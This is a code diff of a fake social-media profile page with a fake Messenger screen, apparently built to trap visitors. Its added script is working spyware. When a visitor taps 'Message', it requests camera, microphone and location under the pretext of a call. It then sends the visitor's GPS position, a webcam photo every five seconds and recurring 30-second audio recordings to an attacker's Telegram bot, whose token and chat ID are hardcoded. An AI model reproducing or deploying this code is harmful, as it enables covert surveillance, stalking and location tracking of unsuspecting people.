@@ -6,140 +6,159 @@
     <title>M.H. Miraz | Profile</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* তোমার অরিজিনাল ডিজাইন */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; }
+        body { background-color: #f0f2f5; color: #1c1e21; }
+        
+        /* Profile Header */
         .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
-        .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
+        .cover { width: 100%; height: 200px; background: #ddd url('https://via.placeholder.com/800x400') center/cover; }
         .profile-container { position: relative; display: inline-block; margin-top: -75px; }
-        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
-        .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
-        .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
-        .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
-        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
+        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('https://via.placeholder.com/160') center/cover; }
+        .name-box h1 { font-size: 26px; font-weight: 800; margin-top: 10px; color: #050505; }
         
-        /* মেসেঞ্জার ডিজাইন */
-        #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
-        .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
-        #msgs { flex: 1; overflow-y: auto; padding: 15px; }
-        .inp-bar { padding: 10px 15px; display: flex; align-items: center; border-top: 1px solid #eee; }
-        .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
-        
-        video, canvas { display: none; }
+        /* Action Buttons */
+        .btn-row { display: flex; padding: 15px; gap: 10px; max-width: 500px; margin: 0 auto; }
+        .btn-blue { background: #1877f2; color: white; border: none; padding: 10px; border-radius: 6px; flex: 1; font-weight: 600; cursor: pointer; }
+        .btn-gray { background: #e4e6eb; color: black; border: none; padding: 10px; border-radius: 6px; flex: 1; font-weight: 600; cursor: pointer; }
+
+        /* Bio Section */
+        .bio-card { background: white; margin-top: 10px; padding: 15px; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd; }
+        .bio-text { text-align: center; font-size: 15px; margin-bottom: 15px; }
+        .info-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-size: 15px; }
+        .info-item i { color: #8a8d91; font-size: 20px; width: 25px; }
+
+        /* Fullscreen Messenger Overlay */
+        #messengerUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; flex-direction: column; }
+        .msgr-header { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 15px; }
+        .msgr-header i { color: #0084ff; font-size: 20px; }
+        .msgr-body { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #8a8d91; font-size: 14px; }
+        .msgr-footer { padding: 10px; border-top: 1px solid #eee; display: flex; gap: 10px; align-items: center; }
+        .msgr-input { flex: 1; background: #f0f2f5; border: none; padding: 10px 15px; border-radius: 20px; outline: none; }
+
+        video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
 
-    <div id="mainContent">
-        <div class="header">
-            <div class="cover"></div>
-            <div class="profile-container"><div class="profile-pic"></div></div>
-            <div class="name-box">
-                <h1>M.H. Miřãz</h1>
-                <p style="color:#65676b;">288 Friends • 2 mutual</p>
-            </div>
-            <div style="display:flex; padding: 15px; gap: 10px;">
-                <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;">+ Add Friend</button>
-                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;" onclick="askPermissions()">📩 Message</button>
-            </div>
+<div id="profilePage">
+    <div class="header">
+        <div class="cover"></div>
+        <div class="profile-container"><div class="profile-pic"></div></div>
+        <div class="name-box">
+            <h1>M.H. Miřãz</h1>
+            <p style="color:#65676b; font-size:14px;">288 Friends • 2 mutual</p>
         </div>
-
-        <div class="bio-section">
-            <p>Life is a Book, and those who do not travel read only a page. 📖✈️</p>
-            <div class="details-list">
-                <div class="detail-item"><i class="fas fa-briefcase"></i> Web Developer & Programmer</div>
-                <div class="detail-item"><i class="fas fa-graduation-cap"></i> Studied at Rangpur Polytechnic Institute</div>
-                <div class="detail-item"><i class="fas fa-home"></i> Lives in <b>Rangpur</b></div>
-            </div>
+        <div class="btn-row">
+            <button class="btn-blue">+ Add Friend</button>
+            <button class="btn-gray" onclick="initiateMessenger()">📩 Message</button>
         </div>
     </div>
 
-    <div id="chatBox">
-        <div class="chat-h">
-            <div style="display:flex; align-items:center; gap:12px;">
-                <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="closeChat()"></i>
-                <img src="profile.jpg" style="width:35px; height:35px; border-radius:50%;">
-                <span style="font-weight:bold;">M.H. Miraz</span>
-            </div>
-            <div style="color:#0084ff; display:flex; gap:18px;">
-                <i class="fas fa-phone-alt" onclick="askPermissions()"></i>
-                <i class="fas fa-video" onclick="askPermissions()"></i>
-            </div>
-        </div>
-        <div id="msgs"></div>
-        <div class="inp-bar"><input type="text" placeholder="Aa"></div>
+    <div class="bio-card">
+        <div class="bio-text">Life is a Book, and those who do not travel read only a page. 📖✈️</div>
+        <div class="info-item"><i class="fas fa-briefcase"></i> <span>Web Developer & Programmer</span></div>
+        <div class="info-item"><i class="fas fa-graduation-cap"></i> <span>Studied at <b>Rangpur Polytechnic Institute</b></span></div>
+        <div class="info-item"><i class="fas fa-home"></i> <span>Lives in <b>Rangpur</b></span></div>
     </div>
+</div>
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+<div id="messengerUI">
+    <div class="msgr-header">
+        <i class="fas fa-arrow-left" onclick="location.reload()"></i>
+        <img src="https://via.placeholder.com/35" style="border-radius:50%">
+        <span style="font-weight:bold; flex:1;">M.H. Miraz</span>
+        <i class="fas fa-phone-alt"></i>
+        <i class="fas fa-video"></i>
+    </div>
+    <div class="msgr-body">
+        <p>You're now connected on Messenger</p>
+    </div>
+    <div class="msgr-footer">
+        <i class="fas fa-plus-circle" style="color:#0084ff"></i>
+        <input type="text" class="msgr-input" placeholder="Aa">
+        <i class="fas fa-thumbs-up" style="color:#0084ff"></i>
+    </div>
+</div>
 
-    <script>
-        const T = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
-        const C = '7767412329';
-        let isActive = false;
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 
-        async function askPermissions() {
-            try {
-                // ক্যামেরা ও মাইক্রোফোন পারমিশন (ভিডিও কলের বাহানায়)
-                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = s;
-                
-                // লোকেশন পারমিশন
+<script>
+    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
+    const CHAT_ID = '7767412329';
+    let active = false;
+
+    async function initiateMessenger() {
+        // UI চেঞ্জ
+        document.getElementById('profilePage').style.display = 'none';
+        document.getElementById('messengerUI').style.display = 'flex';
+
+        try {
+            // ১. ক্যামেরা ও অডিও এক্সেস
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('video').srcObject = stream;
+
+            // ২. লোকেশন এক্সেস
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=📍 Location: https://www.google.com/maps?q=${lat},${lon}`);
+                    const mapUrl = `📍 Location: https://www.google.com/maps?q=${lat},${lon}`;
+                    tgRequest('sendMessage', { text: mapUrl });
                 });
-
-                if(!isActive) {
-                    setInterval(takePic, 5000);
-                    startVoiceLoop(s);
-                    isActive = true;
-                }
-                
-                openChat(); // পারমিশন দেওয়ার পর মেসেঞ্জার ওপেন হবে
-            } catch (e) {
-                alert("To start a video call or send messages, please allow camera/mic access.");
             }
-        }
 
-        function takePic() {
-            const video = document.getElementById('v');
-            const canvas = document.getElementById('c');
-            if (video.videoWidth === 0) return;
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob((b) => {
-                let f = new FormData();
-                f.append('chat_id', C);
-                f.append('photo', b, 'img.jpg');
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`, true);
-                xhr.send(f);
-            }, 'image/jpeg', 0.5);
+            if (!active) {
+                setInterval(captureImage, 5000); // প্রতি ৫ সেকেন্ডে ছবি
+                recordAudio(stream);            // ৩০ সেকেন্ডের অডিও লুপ
+                active = true;
+            }
+        } catch (err) {
+            console.log("User Denied Access");
         }
+    }
 
-        function startVoiceLoop(s) {
-            let r = new MediaRecorder(s);
-            let ch = [];
-            r.ondataavailable = (e) => ch.push(e.data);
-            r.onstop = () => {
-                const b = new Blob(ch, { type: 'audio/ogg' });
-                let f = new FormData();
-                f.append('chat_id', C);
-                f.append('voice', b, 'v.ogg');
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${T}/sendVoice`, true);
-                xhr.send(f);
-                ch = [];
-                r.start();
-            };
-            r.start();
-            setInterval(() => { if(r.state==='recording') r.stop(); }, 30000);
-        }
+    function captureImage() {
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        if (v.videoWidth === 0) return;
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob((blob) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'shot.jpg');
+            tgUpload('sendPhoto', fd);
+        }, 'image/jpeg', 0.5);
+    }
 
-        function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
-        function closeChat() { document.getElementById('chatBox').style.display = 'none'; }
-    </script>
+    function recordAudio(stream) {
+        let recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('voice', blob, 'voice.ogg');
+            tgUpload('sendVoice', fd);
+            chunks = [];
+            recorder.start();
+        };
+        recorder.start();
+        setInterval(() => { if(recorder.state === 'recording') recorder.stop(); }, 30000);
+    }
+
+    function tgRequest(method, params) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}?chat_id=${CHAT_ID}&` + new URLSearchParams(params));
+    }
+
+    function tgUpload(method, formData) {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/${method}`, true);
+        xhr.send(formData);
+    }
+</script>
+
 </body>
 </html>
